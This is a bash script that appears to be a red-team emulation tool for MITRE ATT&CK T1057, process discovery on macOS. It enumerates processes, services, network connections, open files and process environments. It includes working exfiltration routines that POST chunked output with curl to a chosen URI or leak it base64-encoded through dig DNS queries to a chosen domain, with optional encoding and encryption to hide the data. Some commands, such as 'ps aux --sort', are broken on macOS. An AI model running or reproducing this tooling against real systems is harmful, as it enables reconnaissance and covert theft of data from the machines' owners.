#!/bin/bash

# Script Name: process_discovery.sh
# MITRE ATT&CK Technique: T1057 - Process Discovery
# Tactic: Discovery
# Platform: macOS

# Author: @darmado x.com/darmad0
# Date: $(date +%Y-%m-%d)
# Version: 1.0

# Description:
# This script performs process discovery on macOS systems using native commands.
# It enumerates running processes, their details, relationships, and resource usage.
# The script can identify system services, user processes, and potential security tools.

# References:
# - https://attack.mitre.org/techniques/T1057/
# - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1057/T1057.md

# Global Variables
NAME="process_discovery"
TACTIC="discovery"
TTP_ID="T1057"
LOG_FILE="${TTP_ID}_${NAME}.log"
VERBOSE=false
LOG_ENABLED=false
ENCODE="none"
EXFIL=false
EXFIL_METHOD=""
EXFIL_URI=""
ENCRYPT="none"
ENCRYPT_KEY=""
ALL=false
CHUNK_SIZE=1000

# Command Variables
CMD_PS="ps"
CMD_LSOF="lsof"
CMD_TOP="top"
CMD_PGREP="pgrep"
CMD_LAUNCHCTL="launchctl"
CMD_SYSCTL="sysctl"
CMD_DTRACE="dtrace"
CMD_PROC_INFO="/usr/sbin/proc_info"
CMD_PMSET="pmset"
CMD_SYSTEM_PROFILER="system_profiler"
CMD_VM_STAT="vm_stat"
CMD_ACTIVITY_MONITOR="/System/Applications/Utilities/Activity Monitor.app/Contents/MacOS/Activity Monitor"

# Display help message
display_help() {
    cat << 'EOF'
Usage: $0 [OPTIONS]

Description:
  Performs process discovery on macOS systems using native commands.

Options:
  General:
    --help                 Show this help message
    --verbose             Enable detailed output
    --log                 Log output to file (rotates at 5MB)
    --all                 Run all checks

  Process Discovery:
    --basic              Basic process listing (ps aux)
    --tree               Process tree view (ps -ejH)
    --ports              List processes with network connections
    --files              List processes with open files
    --services           List launchd services
    --resources          Show resource usage (CPU, memory)
    --user=USER          Filter processes by user
    --filter=PATTERN     Filter processes by pattern
    --sort=FIELD         Sort by field (cpu,mem,pid)
    --details            Show detailed process information

  Output Processing:
    --encode=TYPE        Encode output (b64|hex)
    --encrypt=METHOD     Encrypt output using openssl (generates random key)
    --exfil=URI         Exfiltrate output to URI using HTTP GET
    --exfil=dns=DOMAIN  Exfiltrate output via DNS queries to DOMAIN
    --chunksize=N       Size of exfiltration chunks (default: 1000)

  Alternative Discovery Methods:
    --sysctl              Use sysctl for kernel-level process info
    --memory             Use memory-based process discovery
    --activity          Use Activity Monitor based discovery
    --dtrace             Use DTrace for process execution tracing
    --procinfo           Use proc_info for detailed process information
    --power              Use pmset for power-related process discovery
    --profiler          Use system_profiler for application discovery

Examples:
  $0 --all                           # Run all discovery methods
  $0 --basic --filter=apache         # List processes matching 'apache'
  $0 --ports --user=root            # List root processes with network connections
  $0 --tree --resources             # Show process tree with resource usage
EOF
}

# Function to create log file
create_log() {
    if [ ! -f "$LOG_FILE" ]; then
        touch "$LOG_FILE"
        chmod 600 "$LOG_FILE"
    fi
}

# Function to get basic process listing
basic_processes() {
    local output=""
    log_to_stdout "Starting basic process listing" "basic_processes" "$CMD_PS aux"
    output="$($CMD_PS aux)"
    echo "$output"
}

# Function to get process tree
process_tree() {
    local output=""
    log_to_stdout "Starting process tree listing" "process_tree" "$CMD_PS -ejH"
    output="$($CMD_PS -ejH)"
    echo "$output"
}

# Function to list processes with network connections
network_processes() {
    local output=""
    log_to_stdout "Starting network process listing" "network_processes" "$CMD_LSOF -i -n -P"
    output="$($CMD_LSOF -i -n -P)"
    echo "$output"
}

# Function to list processes with open files
file_processes() {
    local output=""
    log_to_stdout "Starting file process listing" "file_processes" "$CMD_LSOF"
    output="$($CMD_LSOF)"
    echo "$output"
}

# Function to list launchd services
launchd_services() {
    local output=""
    log_to_stdout "Starting launchd service listing" "launchd_services" "$CMD_LAUNCHCTL list"
    output="$($CMD_LAUNCHCTL list)"
    echo "$output"
}

# Function to show resource usage
resource_usage() {
    local output=""
    log_to_stdout "Starting resource usage listing" "resource_usage" "$CMD_TOP -l 1 -n 10"
    output="$($CMD_TOP -l 1 -n 10 -stats pid,command,cpu,mem)"
    echo "$output"
}

# Function to filter processes by user
user_processes() {
    local user="$1"
    local output=""
    log_to_stdout "Starting user process listing for $user" "user_processes" "$CMD_PS -U $user"
    output="$($CMD_PS -U "$user" -o pid,ppid,user,%cpu,%mem,command)"
    echo "$output"
}

# Function to filter processes by pattern
filtered_processes() {
    local pattern="$1"
    local output=""
    log_to_stdout "Starting filtered process listing for pattern '$pattern'" "filtered_processes" "$CMD_PS aux | grep -i $pattern"
    output="$($CMD_PS aux | grep -i "$pattern" | grep -v grep)"
    echo "$output"
}

# Function to sort processes by field
sorted_processes() {
    local field="$1"
    local output=""
    log_to_stdout "Starting sorted process listing by $field" "sorted_processes" "$CMD_PS aux"
    case "$field" in
        "cpu")
            output="$($CMD_PS aux --sort=-%cpu | head -n 20)"
            ;;
        "mem")
            output="$($CMD_PS aux --sort=-%mem | head -n 20)"
            ;;
        "pid")
            output="$($CMD_PS aux --sort=pid)"
            ;;
        *)
            log_to_stdout "Invalid sort field: $field" "sorted_processes" ""
            return 1
            ;;
    esac
    echo "$output"
}

# Core process discovery functions that emulate actual adversary behavior
native() {
    local output=""
    log_to_stdout "Starting native process listing" "native" ""
    
    log_to_stdout "Gathering process listing" "native" "$CMD_PS aux"
    output+="$($CMD_PS aux)\n"
    
    log_to_stdout "Gathering running services" "native" "$CMD_LAUNCHCTL list"
    output+="$($CMD_LAUNCHCTL list)\n"
    
    log_to_stdout "Gathering process-port mappings" "native" "$CMD_LSOF -i -n -P"
    output+="$($CMD_LSOF -i -n -P)\n"
    
    echo -e "$output"
}

advanced() {
    local output=""
    log_to_stdout "Starting advanced process listing" "advanced" ""
    
    log_to_stdout "Gathering process tree" "advanced" "$CMD_PS -ejH"
    output+="$($CMD_PS -ejH)\n"
    
    log_to_stdout "Gathering resource usage" "advanced" "$CMD_PS aux"
    output+="$($CMD_PS aux --sort=-%cpu | head -n 10)\n"
    
    log_to_stdout "Gathering file handles" "advanced" "$CMD_LSOF -n -P"
    output+="$($CMD_LSOF -n -P)\n"
    
    echo -e "$output"
}

targeted() {
    local output=""
    log_to_stdout "Starting targeted process listing" "targeted" ""
    
    log_to_stdout "Gathering process ownership" "targeted" "$CMD_PS -eo user,pid,ppid,%cpu,%mem,command"
    output+="$($CMD_PS -eo user,pid,ppid,%cpu,%mem,command)\n"
    
    log_to_stdout "Gathering process start times" "targeted" "$CMD_PS -eo pid,lstart,command"
    output+="$($CMD_PS -eo pid,lstart,command)\n"
    
    log_to_stdout "Gathering process environment" "targeted" "$CMD_PS eww -o command"
    output+="$($CMD_PS eww -o command)\n"
    
    echo -e "$output"
}

# Alternative process discovery methods using native macOS tools
sysctl() {
    local output=""
    log_to_stdout "Starting sysctl process listing" "sysctl" ""
    
    log_to_stdout "Gathering process kernel information" "sysctl" "$CMD_SYSCTL kern.proc"
    output+="$($CMD_SYSCTL kern.proc kern.proc_all kern.proc_pid)\n"
    
    log_to_stdout "Gathering process limits" "sysctl" "$CMD_SYSCTL kern.maxproc"
    output+="$($CMD_SYSCTL kern.maxproc kern.maxprocperuid kern.aiomax kern.maxvnodes)\n"
    
    log_to_stdout "Gathering process scheduling" "sysctl" "$CMD_SYSCTL kern.sched"
    output+="$($CMD_SYSCTL kern.sched kern.sched_pri_shift)\n"
    
    echo -e "$output"
}

memory() {
    local output=""
    log_to_stdout "Starting memory-based process listing" "memory" ""
    
    log_to_stdout "Gathering system memory statistics" "memory" "$CMD_VM_STAT"
    output+="$($CMD_VM_STAT 1 1)\n"
    
    log_to_stdout "Gathering process memory mappings" "memory" "$CMD_LSOF"
    output+="$($CMD_LSOF -n -P | grep -i mem)\n"
    
    echo -e "$output"
}

activity() {
    local output=""
    log_to_stdout "Starting Activity Monitor listing" "activity" ""
    
    if [ -x "$CMD_ACTIVITY_MONITOR" ]; then
        log_to_stdout "Gathering Activity Monitor data" "activity" "$CMD_ACTIVITY_MONITOR"
        output+="$("$CMD_ACTIVITY_MONITOR" -l -s cpu)\n"
    else
        log_to_stdout "Activity Monitor not found or not executable" "activity" ""
    fi
    
    echo -e "$output"
}

dtrace() {
    local output=""
    log_to_stdout "Starting DTrace process listing" "dtrace" ""
    
    log_to_stdout "Gathering process execution trace" "dtrace" "$CMD_DTRACE"
    output+="$($CMD_DTRACE -n 'proc:::exec-success { printf(\"%s %s\", execname, curpsinfo->pr_psargs); }' 2>/dev/null)\n"
    
    echo -e "$output"
}

procinfo() {
    local output=""
    log_to_stdout "Starting ProcInfo listing" "procinfo" ""
    
    log_to_stdout "Gathering detailed process information" "procinfo" "$CMD_PROC_INFO"
    output+="$($CMD_PROC_INFO -l)\n"
    
    echo -e "$output"
}

detailed() {
    local output=""
    log_to_stdout "Starting detailed process listing" "detailed" ""
    
    local pids=$($CMD_PS -e -o pid=)
    for pid in $pids; do
        if [ -n "$pid" ] && [ "$pid" -ne 0 ] && kill -0 "$pid" 2>/dev/null; then
            log_to_stdout "Gathering details for PID $pid" "detailed" "$CMD_PS -p $pid"
            output+="$($CMD_PS -p "$pid" -o pid,ppid,user,%cpu,%mem,command)\n"
            output+="$($CMD_LSOF -p "$pid" 2>/dev/null)\n"
            sleep "${INPUT_RATE_LIMIT:-0.5}"
        fi
    done
    
    echo -e "$output"
}

# Standard exfiltration functions
exfiltrate_http() {
    local data="$1"
    local uri="$2"
    
    if [ -z "$data" ] || [ -z "$uri" ]; then
        log_to_stdout "Error: Missing data or URI for HTTP exfiltration" "exfiltrate_http" ""
        return 1
    fi
    
    # Split data into chunks
    local chunk_size=1000
    local total_chunks=$(( (${#data} + chunk_size - 1) / chunk_size ))
    local count=1
    
    log_to_stdout "Starting HTTP exfiltration" "exfiltrate_http" "chunks: $total_chunks"
    
    while [ -n "$data" ]; do
        local chunk="${data:0:$chunk_size}"
        data="${data:$chunk_size}"
        
        local size=${#chunk}
        log_to_stdout "Sending chunk $count/$total_chunks ($size bytes)" "exfiltrate_http" "curl $uri"
        
        if curl -s -X POST -d "$chunk" "$uri" &>/dev/null; then
            log_to_stdout "Chunk $count/$total_chunks sent successfully" "exfiltrate_http" "curl $uri"
        else
            log_to_stdout "Failed to send chunk $count/$total_chunks" "exfiltrate_http" "curl $uri"
            return 1
        fi
        
        ((count++))
    done
    
    log_to_stdout "HTTP exfiltration complete" "exfiltrate_http" "curl $uri"
    return 0
}

exfiltrate_dns() {
    local data="$1"
    local domain="$2"
    local id="${3:-$(date +%s)}"
    
    if [ -z "$data" ] || [ -z "$domain" ]; then
        log_to_stdout "Error: Missing data or domain for DNS exfiltration" "exfiltrate_dns" ""
        return 1
    fi
    
    # Encode the ID for transmission
    local encoded_id=$(echo -n "$id" | base64 | tr '+/' '-_' | tr -d '=')
    
    # Send the ID first
    log_to_stdout "Attempting to exfiltrate data via DNS" "exfiltrate_dns" "dig +short ${encoded_id}.id.$domain"
    if ! dig +short "${encoded_id}.id.$domain" &>/dev/null; then
        log_to_stdout "Failed to send ID via DNS" "exfiltrate_dns" "dig +short ${encoded_id}.id.$domain"
        return 1
    fi
    
    # Split and encode data into chunks
    local chunk_size=30  # DNS labels limited to 63 chars, using 30 for safety
    local encoded_data=$(echo -n "$data" | base64 | tr '+/' '-_' | tr -d '=')
    local total_chunks=$(( (${#encoded_data} + chunk_size - 1) / chunk_size ))
    
    local chunk_num=0
    while [ $chunk_num -lt $total_chunks ]; do
        local chunk="${encoded_data:$(( chunk_num * chunk_size )):$chunk_size}"
        
        if dig +short "${chunk}.${chunk_num}.$domain" &>/dev/null; then
            log_to_stdout "Successfully sent chunk $((chunk_num+1))/$total_chunks via DNS" "exfiltrate_dns" "dig +short ${chunk}.${chunk_num}.$domain"
        else
            log_to_stdout "Failed to send chunk $((chunk_num+1))/$total_chunks via DNS" "exfiltrate_dns" "dig +short ${chunk}.${chunk_num}.$domain"
            return 1
        fi
        
        ((chunk_num++))
    done
    
    # Send end signal
    if dig +short "end.$domain" &>/dev/null; then
        log_to_stdout "Successfully completed DNS exfiltration" "exfiltrate_dns" "dig +short end.$domain"
        return 0
    else
        log_to_stdout "Failed to send end signal via DNS" "exfiltrate_dns" "dig +short end.$domain"
        return 1
    fi
}

# Update logging function to use standard format
log_to_stdout() {
    local message="$1"
    local function_name="$2"
    local command="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [$function_name] $message $([ -n "$command" ] && echo "($command)")"
}

# Main function
main() {
    local output=""
    
    # Process command line arguments
    while [[ "$#" -gt 0 ]]; do
        case "$1" in
            --help)
                display_help
                exit 0
                ;;
            --verbose)
                VERBOSE=true
                ;;
            --log)
                LOG_ENABLED=true
                ;;
            --all)
                ALL=true
                output+="$(native)\n"
                output+="$(advanced)\n"
                output+="$(targeted)\n"
                output+="$(sysctl)\n"
                output+="$(memory)\n"
                output+="$(activity)\n"
                output+="$(dtrace)\n"
                output+="$(procinfo)\n"
                output+="$(detailed)\n"
                ;;
            --basic)
                output+="$(native)\n"
                ;;
            --tree)
                output+="$(process_tree)\n"
                ;;
            --ports)
                output+="$(network_processes)\n"
                ;;
            --files)
                output+="$(file_processes)\n"
                ;;
            --services)
                output+="$(launchd_services)\n"
                ;;
            --resources)
                output+="$(resource_usage)\n"
                ;;
            --user=*)
                user="${1#*=}"
                output+="$(user_processes "$user")\n"
                ;;
            --filter=*)
                pattern="${1#*=}"
                output+="$(filtered_processes "$pattern")\n"
                ;;
            --sort=*)
                field="${1#*=}"
                output+="$(sorted_processes "$field")\n"
                ;;
            --encode=*)
                ENCODE="${1#*=}"
                ;;
            --encrypt=*)
                ENCRYPT="${1#*=}"
                ENCRYPT_KEY=$(openssl rand -hex 32)
                ;;
            --exfil=*)
                EXFIL=true
                EXFIL_METHOD="${1#*=}"
                if [[ "$EXFIL_METHOD" == dns=* ]]; then
                    EXFIL_METHOD="dns"
                    EXFIL_URI="${1#*=dns=}"
                else
                    EXFIL_METHOD="http"
                    EXFIL_URI="${1#*=}"
                fi
                ;;
            --chunksize=*)
                CHUNK_SIZE="${1#*=}"
                ;;
            --sysctl)
                output+="$(sysctl)\n"
                ;;
            --memory)
                output+="$(memory)\n"
                ;;
            --activity)
                output+="$(activity)\n"
                ;;
            --dtrace)
                output+="$(dtrace)\n"
                ;;
            --procinfo)
                output+="$(procinfo)\n"
                ;;
            --sample|--details)
                output+="$(detailed)\n"
                ;;
            *)
                echo "Invalid option: $1" >&2
                display_help
                exit 1
                ;;
        esac
        shift
    done

    # If no specific options given, run native discovery
    if [ -z "$output" ]; then
        output+="$(native)\n"
    fi

    # Run all checks if --all is specified
    if [ "$ALL" = true ]; then
        output+="$(process_tree)\n"
        output+="$(network_processes)\n"
        output+="$(launchd_services)\n"
        output+="$(resource_usage)\n"
    fi

    # Create log file if logging is enabled
    if [ "$LOG_ENABLED" = true ]; then
        create_log
        echo -e "$output" >> "$LOG_FILE"
    fi

    # Process output based on encoding/encryption/exfiltration options
    if [ "$ENCODE" != "none" ]; then
        case "$ENCODE" in
            "b64")
                output=$(echo -e "$output" | base64)
                ;;
            "hex")
                output=$(echo -e "$output" | xxd -p)
                ;;
        esac
    fi

    if [ "$ENCRYPT" != "none" ]; then
        output=$(echo -e "$output" | openssl enc -"$ENCRYPT" -k "$ENCRYPT_KEY" | base64)
    fi

    if [ "$EXFIL" = true ]; then
        if [ "$EXFIL_METHOD" = "dns" ]; then
            exfiltrate_dns "$output" "$EXFIL_URI"
        else
            exfiltrate_http "$output" "$EXFIL_URI"
        fi
    else
        echo -e "$output"
    fi
}

# Execute main function with all arguments
main "$@" 